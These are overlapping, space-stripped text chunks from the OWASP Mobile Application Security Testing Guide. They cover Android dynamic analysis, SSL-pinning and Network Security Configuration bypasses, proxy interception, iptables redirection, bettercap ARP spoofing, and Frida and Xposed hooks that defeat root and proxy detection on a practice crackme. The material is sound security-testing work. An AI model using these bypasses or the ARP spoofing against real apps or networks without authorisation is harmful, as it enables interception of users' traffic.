    "text": "can have one of several file extensions, including.soand.dll(x86support). Thisfoldercontainssubdirectoriesfortheplatformstheapphasnativelibraries for,including – armeabi: compiledcodeforallARM-basedprocessors – armeabi-v7a: compiledcodeforallARM-basedprocessors,version7andaboveonly – arm64-v8a: compiledcodeforall64-bitARM-basedprocessors,version8andabovebasedonly – x86: compiledcodeforx86processorsonly – x86_64: compiledcodeforx86_64processorsonly – mips: compiledcodeforMIPSprocessors • shared_prefs: ThisfoldercontainsanXMLfilethatstoresvaluessavedviatheSharedPreferencesAPIs. • files: Thisfolderstoresregularfilescreatedbytheapp. • databases: ThisfolderstoresSQLitedatabasefilesgeneratedbytheappatruntime,e.g.,userdatafiles. However,theappmightstoremoredatanotonlyinsidethesefoldersbutalsointheparentfolder(/data/data/[package- name]). Refertothe“TestingDataStorage”chapterformoreinformationandbestpracticesonsecurelystoringsensitivedata. 126\\nDynamic Analysis on Non-Rooted Devices Platform: android Non-rooteddeviceshavethebenefitofreplicatinganenvironmentthattheapplicationisintendedtorunon. Thankstotoolslikeobjection,youcanpatchtheappinordertotestitlikeifyouwereonarooteddevice(butofcourse being jailed to that one app). To do that you have to perform one additional step: patch the APK to include the Frida gadgetlibrary. Nowyoucanuseobjectiontodynamicallyanalyzetheapplicationonnon-rooteddevices. ThefollowingcommandssummarizehowtopatchandstartdynamicanalysisusingobjectionusingtheUnCrackableApp forAndroidLevel1asanexample: ##DownloadtheUncrackableAPK $wgethttps://raw.githubusercontent.com/OWASP/owasp-mastg/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk ##PatchtheAPKwiththeFridaGadget $objectionpatchapk --source UnCrackable-Level1.apk ##InstallthepatchedAPKontheandroidphone $adbinstallUnCrackable-Level1.objection.apk ##Afterrunningthemobilephone,objectionwilldetecttherunningfrida-serverthroughtheAPK $objectionexplore Static Analysis on Android Platform: android Bypassing Certificate Pinning Platform: android SomeapplicationswillimplementSSLPinning,whichpreventstheapplicationfromacceptingyourinterceptingcertificate asavalidcertificate. Thismeansthatyouwillnotbeabletomonitorthetrafficbetweentheapplicationandtheserver. Formostapplications,certificatepinningcanbebypassedwithinseconds,butonlyiftheappusestheAPIfunctionsthat arecoveredbythesetools. IftheappisimplementingSSLPinningwithacustomframeworkorlibrary,theSSLPinning mustbemanuallypatchedanddeactivated,whichcanbetime-consuming. ThissectiondescribesvariouswaystobypassSSLPinningandgivesguidanceaboutwhatyoushoulddowhentheexisting toolsdon’thelp. Bypassing Methods Thereareseveralwaystobypasscertificatepinningforablackboxtest,dependingontheframeworksavailableonthe device: • CydiaSubstrate: InstalltheAndroid-SSL-TrustKillerpackage. • Frida: Usethefrida-multiple-unpinningscript. • Objection: Usetheandroid sslpinning disablecommand. • Xposed: InstalltheTrustMeAlreadyorSSLUnpinningmodule. If you have a rooted device with frida-server installed, you can bypass SSL pinning by running the following Objection command(repackageyourappifyou’reusinganon-rooteddevice): androidsslpinningdisable Here’sanexampleoftheoutput: 127\\nFigure 1: objection Android SSL Pinning Bypass See also Objection’s help on Disabling SSL Pinning for Android for further information and inspect the pinning.ts file to understandhowthebypassworks. Bypass Custom Certificate Pinning Statically Somewhereintheapplication,boththeendpointandthecertificate(oritshash)mustbedefined. Afterdecompilingthe application,youcansearchfor: • Certificatehashes: grep-ri\"sha256\\|sha1\"./smali. Replacetheidentifiedhasheswiththehashofyourproxy’s CA.Alternatively,ifthehashisaccompaniedbyadomainname,youcantrymodifyingthedomainnametoanon- existingdomainsothattheoriginaldomainisnotpinned. ThisworkswellonobfuscatedOkHTTPimplementations. • Certificatefiles: find ./assets -type f \\( -iname \\*.cer -o -iname \\*.crt \\). Replacethesefileswithyour proxy’scertificates,makingsuretheyareinthecorrectformat. • Truststore files: find ./ -type f \\( -iname \\*.jks -o -iname \\*.bks \\). Add your proxy’s certificates to the truststoreandmakesuretheyareinthecorrectformat. Keep in mind that an app might contain files without extension. The most common file locations areassets and resdirectories,whichshouldalsobeinvestigated. As an example, let’s say that you find an application which uses a BKS (BouncyCastle) truststore and it’s stored in the file res/raw/truststore.bks. To bypass SSL Pinning you need to add your proxy’s certificate to the truststore with thecommandlinetoolkeytool. KeytoolcomeswiththeJavaSDKandthefollowingvaluesareneededtoexecutethe command: • password-Passwordforthekeystore. Lookinthedecompiledappcodeforthehardcodedpassword. • providerpath-LocationoftheBouncyCastleProviderjarfile. YoucandownloaditfromTheLegionoftheBouncy Castle. • proxy.cer-Yourproxy’scertificate. • aliascert-Uniquevaluewhichwillbeusedasaliasforyourproxy’scertificate. Toaddyourproxy’scertificateusethefollowingcommand: keytool -importcert -v-trustcacerts -file proxy.cer -alias aliascert -keystore \"res/raw/truststore.bks\" -provider ↪ org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath \"providerpath/bcprov-jdk15on-164.jar\" -storetype BKS-storepass password TolistcertificatesintheBKStruststoreusethefollowingcommand: 128\\nkeytool-list-keystore\"res/raw/truststore.bks\"-providerorg.bouncycastle.jce.provider.BouncyCastleProvider-providerpath\"providerpath/bcprov-jdk15on-164.jar\" ↪ -storetype BKS-storepass password Aftermakingthesemodifications,repackagetheapplicationusingapktoolandinstallitonyourdevice. Iftheapplicationusesnativelibrariestoimplementnetworkcommunication,furtherreverseengineeringisneeded. An exampleofsuchanapproachcanbefoundintheblogpostIdentifyingtheSSLPinninglogicinsmalicode, patchingit, andreassemblingtheAPK Bypass Custom Certificate Pinning Dynamically Bypassingthepinninglogicdynamicallymakesitmoreconvenientasthereisnoneedtobypassanyintegritychecksand it’smuchfastertoperformtrial&errorattempts. Finding the correct method to hook is typically the hardest part and can take quite some time depending on the level of obfuscation. As developers typically reuse existing libraries, it is a good approach to search for strings and license filesthatidentifytheusedlibrary. Oncethelibraryhasbeenidentified,examinethenon-obfuscatedsourcecodetofind methodswhicharesuitedfordynamicinstrumentation. As an example, let’s say that you find an application which uses an obfuscated OkHTTP3 library. The documentation showsthattheCertificatePinner.Builderclassisresponsibleforaddingpinsforspecificdomains. Ifyoucanmodify theargumentstotheBuilder.addmethod,youcanchangethehashestothecorrecthashesbelongingtoyourcertificate. Findingthecorrectmethodcanbedoneineithertwoways,asexplainedinthisblogpostbyJeroenBeckers: • Searchforhashesanddomainnamesasexplainedintheprevioussection. Theactualpinningmethodwilltypically beusedordefinedincloseproximitytothesestrings • SearchforthemethodsignatureintheSMALIcode FortheBuilder.addmethod,youcanfindthepossiblemethodsbyrunningthefollowinggrepcommand: grep -ri java/ lang/String;\\[Ljava/lang/String;)L ./ This command will search for all methods that take a string and a variable list of strings as arguments, and return a complexobject. Dependingonthesizeoftheapplication,thismayhaveoneormultiplematchesinthecode. HookeachmethodwithFridaandprintthearguments. Oneofthemwillprintoutadomainnameandacertificatehash, afterwhichyoucanmodifytheargumentstocircumventtheimplementedpinning. Setting Up an Interception Proxy Platform: android SeveraltoolssupportthenetworkanalysisofapplicationsthatrelyontheHTTP(S)protocol. Themostimportanttoolsare theso-calledinterceptionproxies; OWASPZAPandBurpSuiteProfessionalarethemostfamous. Aninterceptionproxy givesthetesteraman-in-the-middleposition. Thispositionisusefulforreadingand/ormodifyingallapprequestsand endpointresponses,whichareusedfortestingAuthorization,Session,Management,etc. Interception Proxy for a Virtual Device Setting Up a Web Proxy on an Android Virtual Device (AVD) Thefollowingprocedure,whichworksontheAndroidemulatorthatshipswithAndroidStudio3.x,isforsettingupanHTTP proxyontheemulator: 1. Setupyourproxytolistenonlocalhostandforexampleport8080. 2. ConfiguretheHTTPproxyintheemulatorsettings: • Clickonthethreedotsintheemulatormenubar • OpentheSettingsMenu • ClickontheProxytab 129\\n• SelectManualproxyconfiguration • Enter“127.0.0.1”intheHostNamefieldandyourproxyportinthePortnumberfield(e.g.,“8080”) • TapApply HTTPandHTTPSrequestsshouldnowberoutedovertheproxyonthehostcomputer. Ifnot,trytogglingairplanemode offandon. AproxyforanAVDcanalsobeconfiguredonthecommandlinebyusingtheemulatorcommandwhenstartinganAVD. ThefollowingexamplestartstheAVDNexus_5X_API_23andsetsaproxyto127.0.0.1andport8080. emulator@Nexus_5X_API_23 -http-proxy 127.0.0.1:8080 Installing a CA Certificate on the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 66
    }
  },
  {
    "text": "endpointresponses,whichareusedfortestingAuthorization,Session,Management,etc. Interception Proxy for a Virtual Device Setting Up a Web Proxy on an Android Virtual Device (AVD) Thefollowingprocedure,whichworksontheAndroidemulatorthatshipswithAndroidStudio3.x,isforsettingupanHTTP proxyontheemulator: 1. Setupyourproxytolistenonlocalhostandforexampleport8080. 2. ConfiguretheHTTPproxyintheemulatorsettings: • Clickonthethreedotsintheemulatormenubar • OpentheSettingsMenu • ClickontheProxytab 129\\n• SelectManualproxyconfiguration • Enter“127.0.0.1”intheHostNamefieldandyourproxyportinthePortnumberfield(e.g.,“8080”) • TapApply HTTPandHTTPSrequestsshouldnowberoutedovertheproxyonthehostcomputer. Ifnot,trytogglingairplanemode offandon. AproxyforanAVDcanalsobeconfiguredonthecommandlinebyusingtheemulatorcommandwhenstartinganAVD. ThefollowingexamplestartstheAVDNexus_5X_API_23andsetsaproxyto127.0.0.1andport8080. emulator@Nexus_5X_API_23 -http-proxy 127.0.0.1:8080 Installing a CA Certificate on the Virtual Device AneasywaytoinstallaCAcertificateistopushthecertificatetothedeviceandaddittothecertificatestoreviaSecurity Settings. Forexample,youcaninstallthePortSwigger(Burp)CAcertificateasfollows: 1. StartBurpanduseawebbrowseronthehosttonavigatetoburp/,thendownloadcacert.derbyclickingthe“CA Certificate”button. 2. Changethefileextensionfrom.derto.cer. 3. Pushthefiletotheemulator: adbpush cacert.cer/sdcard/ 4. NavigatetoSettings->Security->InstallfromSDCard. 5. Scrolldownandtapcacert.cer. Youshouldthenbepromptedtoconfirminstallationofthecertificate(you’llalsobeaskedtosetadevicePINifyouhaven’t already). Thisinstallsthecertificateintheusercertificatestore(testedonGenymotionVM).Inordertoplacethecertificateinthe rootstoreyoucanperformthefollowingsteps: 1. Runadbasrootwithadb rootandadb shell. 2. Locatethenewlyinstalledcertificateat/data/misc/user/0/cacerts-added/. 3. Copythecertificatetothefollowingfolder/system/etc/security/cacerts/. 4. ReboottheAndroidVM. 130\\nFor Android 7.0 (API level 24) and above follow the same procedure described in the “Bypassing the Network Security Configuration”section. Interception Proxy for a Physical Device Theavailablenetworksetupoptionsmustbeevaluatedfirst. Themobiledeviceusedfortestingandthehostcomputer running the interception proxy must be connected to the same Wi-Fi network. Use either an (existing) access point or createanad-hocwirelessnetwork. Once you’ve configured the network and established a connection between the testing host computer and the mobile device,severalstepsremain. • Theproxymustbeconfiguredtopointtotheinterceptionproxy. • Theinterceptionproxy’sCAcertificatemustbeaddedtothetrustedcertificatesintheAndroiddevice’scertificate storage. ThelocationofthemenuusedtostoreCAcertificatesmaydependontheAndroidversionandAndroid OEMmodificationsofthesettingsmenu. • Someapplication(e.g.theChromebrowser)mayshowNET::ERR_CERT_VALIDITY_TOO_LONGerrors,iftheleafcer- tificate happens to have a validity extending a certain time (39 months in case of Chrome). This happens if the defaultBurpCAcertificateisused,sincetheBurpSuiteissuesleafcertificateswiththesamevalidityasitsCAcer- tificate. YoucancircumventthisbycreatingyourownCAcertificateandimportittotheBurpSuite,asexplained inthisblogpost. Aftercompletingthesestepsandstartingtheapp,therequestsshouldshowupintheinterceptionproxy. AvideoofsettingupOWASPZAPwithanAndroiddevicecanbefoundonsecure.force.com. Afewotherdifferences: fromAndroid8.0(APIlevel26)onward,thenetworkbehavioroftheappchangeswhenHTTPS trafficistunneledthroughanotherconnection. AndfromAndroid9(APIlevel28)onward,theSSLSocketandSSLEngine willbehavealittlebitdifferentintermsoferrorhandlingwhensomethinggoeswrongduringthehandshakes. As mentioned before, starting with Android 7.0 (API level 24), the Android OS will no longer trust user CA certificates bydefault, unlessspecifiedintheapplication. Inthefollowingsection, weexplaintwomethodstobypassthisAndroid securitycontrol. Bypassing the Network Security Configuration InthissectionwewillpresentseveralmethodstobypassAndroid’sNetworkSecurityConfiguration. Adding Custom User Certificates to the Network Security Configuration TherearedifferentconfigurationsavailablefortheNetworkSecurityConfigurationtoaddnon-systemCertificateAuthori- tiesviathesrcattribute: <certificates src=[\"system\" |\"user\"|\"raw resource\"] overridePins=[\"true\" |\"false\"]/> Eachcertificatecanbeoneofthefollowing: • \"raw resource\"isanIDpointingtoafilecontainingX.509certificates • \"system\"forthepre-installedsystemCAcertificates • \"user\"foruser-addedCAcertificates The CA certificates trusted by the app can be a system trusted CA as well as a user CA. Usually you will have added the certificate of your interception proxy already as additional CA in Android. Therefore we will focus on the “user” setting,whichallowsyoutoforcetheAndroidapptotrustthiscertificatewiththefollowingNetworkSecurityConfiguration below: 131\\n<network-security-config> <base-config> <trust-anchors> <certificates src=\"system\" /> <certificates src=\"user\" /> </trust-anchors> </base-config> </network-security-config> Toimplementthisnewsettingyoumustfollowthestepsbelow: • Decompiletheappusingadecompilationtoollikeapktool: apktoold <filename>.apk • MaketheapplicationtrustusercertificatesbycreatingaNetworkSecurityConfigurationthatincludes<certifi- cates src=\"user\" />asexplainedabove • Gointothedirectorycreatedbyapktoolwhendecompilingtheappandrebuildtheappusingapktool. Thenewapk willbeinthedistdirectory. apktoolb • Youneedtorepackagetheapp, asexplainedinthe“Repackaging”sectionofthe“ReverseEngineeringandTam- pering”chapter. FormoredetailsontherepackagingprocessyoucanalsoconsulttheAndroiddeveloperdocumen- tation,thatexplainstheprocessasawhole. Notethatevenifthismethodisquitesimpleitsmajordrawbackisthatyouhavetoapplythisoperationforeachapplication youwanttoevaluatewhichisadditionaloverheadfortesting. Bearinmindthatiftheappyouaretestinghasadditionalhardeningmeasures,likeverificationoftheappsignature youmightnotbeabletostarttheappanymore. Aspartoftherepackagingyouwillsigntheappwithyourownkey andthereforethesignaturechangeswillresultintriggeringsuchchecksthatmightleadtoimmediatetermination oftheapp. Youwouldneedtoidentifyanddisablesuchcheckseitherbypatchingthemduringrepackagingofthe appordynamicinstrumentationthroughFrida. ThereisapythonscriptavailablethatautomatesthestepsdescribedabovecalledAndroid-CertKiller. ThisPythonscript canextracttheAPKfromaninstalledAndroidapp,decompileit,makeitdebuggable,addanewNetworkSecurityConfig- urationthatallowsusercertificates,buildsandsignsthenewAPKandinstallsthenewAPKwiththeSSLBypass. pythonmain.py -w *************************************** AndroidCertKiller (v0.1) *************************************** CertKillerWizardMode --------------------------------- Listofdevicesattached 4200dc72f27bc44d device --------------------------------- EnterApplicationPackageName:nsc.android.mstg.owasp.org.android_nsc Package:/data/app/nsc.android.mstg.owasp.org.android_nsc-1/base.apk I.InitiatingAPKextractionfromdevice complete ------------------------------ I.Decompiling complete ------------------------------ I.ApplyingSSLbypass complete ------------------------------ I.BuildingNewAPK complete ------------------------------ I.SigningAPK complete ------------------------------ WouldyouliketoinstalltheAPKonyourdevice(y/N):y ------------------------------------ InstallingUnpinnedAPK ------------------------------ Finished 132\\nAdding the Proxy’s certificate among system trusted CAs using Magisk InordertoavoidtheobligationofconfiguringtheNetworkSecurityConfigurationforeachapplication,wemustforcethe devicetoaccepttheproxy’scertificateasoneofthesystemstrustedcertificates. ThereisaMagiskmodulethatwillautomaticallyaddalluser-installedCAcertificatestothelistofsystemtrustedCAs. DownloadthelatestversionofthemoduleattheGithubReleasepage,pushthedownloadedfileovertothedeviceand import it in the Magisk Manager’s “Module” view by clicking on the + button. Finally, a restart is required by Magisk Managertoletchangestakeeffect. Fromnowon,anyCAcertificatethatisinstalledbytheuservia“Settings”,“Security&location”,“Encryption&creden- tials”, “Install from storage” (location may differ) is automatically pushed into the system’s trust store by this Magisk module. RebootandverifythattheCAcertificateislistedin“Settings”,“Security&location”,“Encryption&credentials”, “Trustedcredentials”(locationmaydiffer). Manually adding the Proxy’s certificate among system trusted CAs Alternatively,youcanfollowthefollowingstepsmanuallyinordertoachievethesameresult: • Makethe/systempartitionwritable,whichisonlypossibleonarooteddevice. Runthe‘mount’commandtomake sure the /system is writable: mount -o rw,remount /system. If this command fails, try running the following commandmount -o rw,remount -t ext4 /system • Preparetheproxy’sCAcertificatestomatchsystemcertificatesformat. Exporttheproxy’scertificatesinderformat (thisisthedefaultformatinBurpSuite)thenrunthefollowingcommands: $openssl x509 -inform DER-incacert.der -out cacert.pem $openssl x509 -inform PEM-subject_hash_old -incacert.pem |head -1 mvcacert.pem <hash>.0 • Finally,copythe<hash>.0fileintothedirectory/system/etc/security/cacertsandthenrunthefollowingcommand: chmod 644<hash>.0 By following the steps described above you allow any application to trust the proxy’s",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 67
    }
  },
  {
    "text": "this command fails, try running the following commandmount -o rw,remount -t ext4 /system • Preparetheproxy’sCAcertificatestomatchsystemcertificatesformat. Exporttheproxy’scertificatesinderformat (thisisthedefaultformatinBurpSuite)thenrunthefollowingcommands: $openssl x509 -inform DER-incacert.der -out cacert.pem $openssl x509 -inform PEM-subject_hash_old -incacert.pem |head -1 mvcacert.pem <hash>.0 • Finally,copythe<hash>.0fileintothedirectory/system/etc/security/cacertsandthenrunthefollowingcommand: chmod 644<hash>.0 By following the steps described above you allow any application to trust the proxy’s certificate, which allows you to interceptitstraffic,unlessofcoursetheapplicationusesSSLpinning. Potential Obstacles Applicationsoftenimplementsecuritycontrolsthatmakeitmoredifficulttoperformasecurityreviewoftheapplication, suchasrootdetectionandcertificatepinning. Ideally,youwouldacquirebothaversionoftheapplicationthathasthese controlsenabled,andonewherethecontrolsaredisabled. Thisallowsyoutoanalyzetheproperimplementationofthe controls,afterwhichyoucancontinuewiththeless-secureversionforfurthertests. Of course, this is not always possible, and you may need to perform a black-box assessment on an application where allsecuritycontrolsareenabled. Thesectionbelowshowsyouhowyoucancircumventcertificatepinningfordifferent applications. Client Isolation in Wireless Networks Onceyou have setup an interceptionproxyandhave a MITM position you mightstill not be able to seeanything. This mightbeduetorestrictionsintheapp(seenextsection)butcanalsobeduetosocalledclientisolationintheWi-Fithat youareconnectedto. WirelessClientIsolationisasecurityfeaturethatpreventswirelessclientsfromcommunicatingwithoneanother. This featureisusefulforguestandBYODSSIDsaddingalevelofsecuritytolimitattacksandthreatsbetweendevicesconnected tothewirelessnetworks. WhattodoiftheWi-Fiweneedfortestinghasclientisolation? YoucanconfiguretheproxyonyourAndroiddevicetopointto127.0.0.1:8080,connectyourphoneviaUSBtoyourhost computeranduseadbtomakeareverseportforwarding: 133\\nadbreversetcp:8080tcp:8080 Once you have done this all proxy traffic on your Android phone will be going to port 8080 on 127.0.0.1 and it will be redirectedviaadbto127.0.0.1:8080onyourhostcomputerandyouwillseenowthetrafficinyourBurp. Withthistrick youareabletotestandintercepttrafficalsoinWi-Fisthathaveclientisolation. Non-Proxy Aware Apps OnceyouhavesetupaninterceptionproxyandhaveaMITMpositionyoumightstillnotbeabletoseeanything. Thisis mainlyduetothefollowingreasons: • TheappisusingaframeworklikeXamarinthatsimplyisnotusingtheproxysettingsoftheAndroidOSor • Theappyouaretestingisverifyingifaproxyissetandisnotallowingnowanycommunication. In both scenarios you would need additional steps to finally being able to see the traffic. In the sections below we are describingtwodifferentsolutions,bettercapandiptables. You could also use an access point that is under your control to redirect the traffic, but this would require additional hardwareandwefocusfornowonsoftwaresolutions. Forbothsolutionsyouneedtoactivate“Supportinvisibleproxying”inBurp,inProxyTab/Options/EditInterface. iptables YoucanuseiptablesontheAndroiddevicetoredirectalltraffictoyourinterceptionproxy. Thefollowingcommandwould redirectport80toyourproxyrunningonport8080 iptables -tnat-AOUTPUT -ptcp--dport 80-jDNAT --to-destination <Your-Proxy-IP>:8080 VerifytheiptablessettingsandchecktheIPandport. $iptables -tnat-L ChainPREROUTING (policyACCEPT) target protoptsource destination ChainINPUT (policyACCEPT) target protoptsource destination ChainOUTPUT (policyACCEPT) target protoptsource destination DNAT tcp -- anywhere anywhere tcpdpt:5288to:<Your-Proxy-IP>:8080 ChainPOSTROUTING (policyACCEPT) target protoptsource destination Chainnatctrl_nat_POSTROUTING (0references) target protoptsource destination Chainoem_nat_pre (0references) target protoptsource destination Incaseyouwanttoresettheiptablesconfigurationyoucanflushtherules: iptables -tnat-F bettercap Readthechapter“TestingNetworkCommunication”andthetestcase“SimulatingaMan-in-the-MiddleAttack”forfurther preparationandinstructionsforrunningbettercap. ThehostcomputerwhereyourunyourproxyandtheAndroiddevicemustbeconnectedtothesamewirelessnetwork. Startbettercapwiththefollowingcommand,replacingtheIPaddressbelow(X.X.X.X)withtheIPaddressofyourAndroid device. 134\\n$sudobettercap -eval \"setarp.spoof.targetsX.X.X.X;arp.spoofon;setarp.spoof.internaltrue;setarp.spoof.fullduplextrue;\" bettercapv2.22 (builtfordarwinamd64withgo1.12.1)[type 'help' foralistofcommands] [19:21:39] [sys.log][inf]arp.spoofenablingforwarding [19:21:39] [sys.log][inf]arp.spoofarpspooferstarted,probing1targets. Proxy Detection Somemobileappsaretryingtodetectifaproxyisset. Ifthat’sthecasetheywillassumethatthisismaliciousandwill notworkproperly. Inordertobypasssuchaprotectionmechanismyoucouldeithersetupbettercaporconfigureiptablesthatdon’tneed aproxysetuponyourAndroidphone. Athirdoptionwedidn’tmentionbeforeandthatisapplicableinthisscenariois usingFrida. ItispossibleonAndroidtodetectifasystemproxyissetbyqueryingtheProxyInfoclassandcheckthe getHost()andgetPort()methods. Theremightbevariousothermethodstoachievethesametaskandyouwouldneed todecompiletheAPKinordertoidentifytheactualclassandmethodname. BelowyoucanfindboilerplatesourcecodeforaFridascriptthatwillhelpyoutooverloadthemethod(inthiscasecalled isProxySet)thatisverifyingifaproxyissetandwillalwaysreturnfalse. Evenifaproxyisnowconfiguredtheappwill nowthinkthatnoneissetasthefunctionreturnsfalse. setTimeout(function(){ Java.perform(function (){ console.log(\"[*]Scriptloaded\") varProxy =Java.use(\"<package-name>.<class-name>\") Proxy.isProxySet.overload().implementation =function(){ console.log(\"[*]isProxySetfunctioninvoked\") return false } }); }); Method Hooking Platform: android Xposed Let’sassumeyou’retestinganappthat’sstubbornlyquittingonyourrooteddevice. Youdecompiletheappandfindthe followinghighlysuspectmethod: package com.example.a.b public static boolean c(){ intv3=0; boolean v0=false; String[]v1=newString[]{\"/sbin/\",\"/system/bin/\",\"/system/xbin/\",\"/data/local/xbin/\", \"/data/local/bin/\",\"/system/sd/xbin/\",\"/system/bin/failsafe/\",\"/data/local/\"}; intv2=v1.length; for(intv3=0;v3<v2;v3++){ if(newFile(String.valueOf(v1[v3])+\"su\").exists()){ v0=true; return v0; } } return v0; } Thismethoditeratesthroughalistofdirectoriesandreturnstrue(devicerooted)ifitfindsthesubinaryinanyofthem. Checkslikethisareeasytodeactivateallyouhavetodoisreplacethecodewithsomethingthatreturns“false”. Method hookingwithanXposedmoduleisonewaytodothis(see“AndroidBasicSecurityTesting”formoredetailsonXposed installationandbasics). 135\\nThe method XposedHelpers.findAndHookMethod allows you to override existing class methods. By inspecting the de- compiledsourcecode, youcanfindoutthatthemethodperformingthecheckisc. Thismethodislocatedintheclass com.example.a.b. ThefollowingisanXposedmodulethatoverridesthefunctionsothatitalwaysreturnsfalse: package com.awesome.pentestcompany; import static de.robv.android.xposed.XposedHelpers.findAndHookMethod; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam; public class DisableRootCheck implements IXposedHookLoadPackage { public void handleLoadPackage(final LoadPackageParamlpparam)throws Throwable { if(!lpparam.packageName.equals(\"com.example.targetapp\")) return; findAndHookMethod(\"com.example.a.b\",lpparam.classLoader,\"c\",newXC_MethodHook(){ @Override protected void beforeHookedMethod(MethodHookParamparam)throws Throwable { XposedBridge.log(\"Caughtrootcheck!\"); param.setResult(false); } }); } } JustlikeregularAndroidapps,modulesforXposedaredevelopedanddeployedwithAndroidStudio. Formoredetailson writing,compiling,andinstallingXposedmodules,refertothetutorialprovidedbyitsauthor,rovo89. Frida We’lluseFridatosolvetheUnCrackableAppforAndroidLevel1anddemonstratehowwecaneasilybypassrootdetection andextractsecretdatafromtheapp. Whenyoustartthecrackmeapponanemulatororarooteddevice,you’llfindthattheitpresentsadialogboxandexits assoonasyoupress“OK”becauseitdetectedroot: 136\\nLet’sseehowwecanpreventthis. Themainmethod(decompiledwithCFR)lookslikethis: package sg.vantagepoint.uncrackable1; import android.app.Activity; import android.app.AlertDialog; import android.content.Context; import android.content.DialogInterface; import android.os.Bundle; import android.text.Editable; import android.view.View; import android.widget.EditText; import sg.vantagepoint.a.b; import sg.vantagepoint.a.c; import sg.vantagepoint.uncrackable1.a; public class MainActivity extends Activity { private void a(Stringstring){ AlertDialogalertDialog =newAlertDialog.Builder((Context)this).create(); alertDialog.setTitle((CharSequence)string); alertDialog.setMessage((CharSequence)\"Thisisunacceptable.Theappisnowgoingtoexit.\"); alertDialog.setButton(-3,(CharSequence)\"OK\",newDialogInterface.OnClickListener(){ public void onClick(DialogInterfacedialogInterface,intn){ System.exit((int)0); } }); alertDialog.setCancelable(false); alertDialog.show(); } protected void onCreate(Bundlebundle){ if(c.a()||c.b()||c.c()){ this.a(\"Rootdetected!\"); } if(b.a(this.getApplicationContext())) { this.a(\"Appisdebuggable!\"); } super.onCreate(bundle); this.setContentView(2130903040); } 137\\n/* *Enabledaggressiveblocksorting */ public void verify(Viewobject){ object =((EditText)this.findViewById(2130837505)).getText().toString(); AlertDialogalertDialog =newAlertDialog.Builder((Context)this).create(); if(a.a((String)object)){ alertDialog.setTitle((CharSequence)\"Success!\"); object =\"Thisisthecorrectsecret.\"; }else { alertDialog.setTitle((CharSequence)\"Nope...\"); object =\"That'snotit.Tryagain.\"; } alertDialog.setMessage((CharSequence)object); alertDialog.setButton(-3,(CharSequence)\"OK\",newDialogInterface.OnClickListener(){ public void onClick(DialogInterfacedialogInterface,intn){ dialogInterface.dismiss(); } }); alertDialog.show(); } } Notice the “Root detected”",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 68
    }
  },
  {
    "text": "alertDialog.show(); } protected void onCreate(Bundlebundle){ if(c.a()||c.b()||c.c()){ this.a(\"Rootdetected!\"); } if(b.a(this.getApplicationContext())) { this.a(\"Appisdebuggable!\"); } super.onCreate(bundle); this.setContentView(2130903040); } 137\\n/* *Enabledaggressiveblocksorting */ public void verify(Viewobject){ object =((EditText)this.findViewById(2130837505)).getText().toString(); AlertDialogalertDialog =newAlertDialog.Builder((Context)this).create(); if(a.a((String)object)){ alertDialog.setTitle((CharSequence)\"Success!\"); object =\"Thisisthecorrectsecret.\"; }else { alertDialog.setTitle((CharSequence)\"Nope...\"); object =\"That'snotit.Tryagain.\"; } alertDialog.setMessage((CharSequence)object); alertDialog.setButton(-3,(CharSequence)\"OK\",newDialogInterface.OnClickListener(){ public void onClick(DialogInterfacedialogInterface,intn){ dialogInterface.dismiss(); } }); alertDialog.show(); } } Notice the “Root detected” message in the onCreate method and the various methods called in the preceding if- statement(whichperformtheactualrootchecks). Alsonotethe“Thisisunacceptable...”messagefromthefirstmethod oftheclass,privatevoida. Obviously,thismethoddisplaysthedialogbox. ThereisanalertDialog.onClickListener callbacksetinthesetButtonmethodcall,whichclosestheapplicationviaSystem.exitaftersuccessfulrootdetection. WithFrida,youcanpreventtheappfromexitingbyhookingtheMainActivity.amethodorthecallbackinsideit. The examplebelowshowshowyoucanhookMainActivity.aandpreventitfromendingtheapplication. setImmediate(function(){ //preventtimeout console.log(\"[*]Startingscript\"); Java.perform(function(){ varmainActivity =Java.use(\"sg.vantagepoint.uncrackable1.MainActivity\"); mainActivity.a.implementation =function(v){ console.log(\"[*]MainActivity.acalled\"); }; console.log(\"[*]MainActivity.amodified\"); }); }); WrapyourcodeinthefunctionsetImmediatetopreventtimeouts(youmayormaynotneedtodothis),thencallJava. performtouseFrida’smethodsfordealingwithJava. AfterwardsretrieveawrapperforMainActivityclassandoverwrite itsamethod. Unliketheoriginal,thenewversionofajustwritesconsoleoutputanddoesn’texittheapp. Analternative solutionistohookonClickmethodoftheOnClickListenerinterface. YoucanoverwritetheonClickmethodandprevent itfromendingtheapplicationwiththeSystem.exitcall. IfyouwanttoinjectyourownFridascript,itshouldeitherdisable theAlertDialogentirelyorchangethebehavioroftheonClickmethodsotheappdoesnotexitwhenyouclick“OK”. Savetheabovescriptasuncrackable1.jsandloadit: frida -U-fowasp.mstg.uncrackable1 -luncrackable1.js --no-pause Afteryouseethe“MainActivity.amodified”messageandtheappwillnotexitanymore. Youcannowtrytoinputa“secretstring”. Butwheredoyougetit? Ifyoulookattheclasssg.vantagepoint.uncrackable1.a,youcanseetheencryptedstringwithwhichyourinputgets compared: package sg.vantagepoint.uncrackable1; import android.util.Base64; import android.util.Log; public class a{ public static boolean a(Stringstring){ byte[]arrby =Base64.decode((String)\"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\",(int)0); try{ arrby =sg.vantagepoint.a.a.a(a.b(\"8d127684cbc37c17616d806cf50473cc\"),arrby); 138\\n} catch (Exceptionexception){ StringBuilderstringBuilder =newStringBuilder(); stringBuilder.append(\"AESerror:\"); stringBuilder.append(exception.getMessage()); Log.d((String)\"CodeCheck\",(String)stringBuilder.toString()); arrby =newbyte[]{}; } return string.equals((Object)newString(arrby)); } public static byte[]b(Stringstring){ intn=string.length(); byte[]arrby =newbyte[n/2]; for(inti=0;i<n;i+=2){ arrby[i/2]=(byte)((Character.digit((char)string.charAt(i),(int)16)<<4)+Character.digit((char)string.charAt(i+1),(int)16)); } return arrby; } } Lookatthestring.equalscomparisonattheendoftheamethodandthecreationofthestringarrbyinthetryblock above. arrby is the return value of the function sg.vantagepoint.a.a.a. string.equals comparison compares your inputwitharrby. 